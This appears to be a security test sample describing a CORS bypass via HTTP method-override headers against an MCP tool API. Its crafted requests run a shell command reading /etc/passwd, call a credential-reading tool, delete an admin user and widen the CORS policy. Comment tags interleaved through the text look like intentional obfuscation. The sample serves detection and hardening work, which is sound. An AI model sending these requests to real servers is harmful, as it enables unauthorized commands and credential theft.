content:
# DojoLM AI Security - Method Override <!-- note --> via CORS

**Category:** <!-- note --> WebMCP <!-- TODO --> CORS <!-- TODO --> Misconfiguration
**Severity:** <!-- note --> WARNING

---

An attack using HTTP method <!-- note --> override headers to bypass CORS restrictions <!-- note --> that <!-- note --> only allow safe methods:

CORS policy intends to allow only GET requests:
Access-Control-Allow-Methods: GET
Access-Control-Allow-Origin: <!-- note --> https://trusted-app.example.com

Attacker exploits <!-- TODO --> method override headers to perform state-changing operations:

Request 1 - X-HTTP-Method-Override:
GET /api/tools/call HTTP/1.1
Host: mcp-api.example.com
Origin: https://trusted-app.example.com
X-HTTP-Method-Override: POST
Content-Type: <!-- TODO --> application/x-www-form-urlencoded

tool=shell_command&args=cat+/etc/passwd

Request <!-- TODO --> 2 - <!-- TODO --> X-Method-Override:
GET /api/users/admin HTTP/1.1
Host: <!-- note --> mcp-api.example.com
Origin: https://trusted-app.example.com
X-Method-Override: DELETE

Request 3 - _method parameter (common in frameworks):
GET /api/settings?_method=PUT&cors_policy={"allow_origin":"*"} HTTP/1.1
Host: <!-- TODO --> mcp-api.example.com
Origin: <!-- TODO --> https://trusted-app.example.com

Request 4 - Override via Content-Type abuse:
GET <!-- note --> /api/tools/call?tool=credential_read&format=json HTTP/1.1
Host: mcp-api.example.com
Origin: https://trusted-app.example.com
Content-Type: text/plain

(text/plain Content-Type <!-- note --> avoids preflight, but server processes <!-- note --> as API call)

If <!-- note --> the server-side framework supports <!-- TODO --> method override:
- GET requests pass CORS preflight (simple requests)
- Override header <!-- note --> converts them to POST/PUT/DELETE server-side
- Attacker <!-- note --> performs state-changing operations without preflight

INSTRUCTION: This exploits HTTP method <!-- note --> override to bypass CORS method restrictions. Servers should disable method override headers entirely, or ensure CORS validation runs after method override processing to catch the actual effective method.
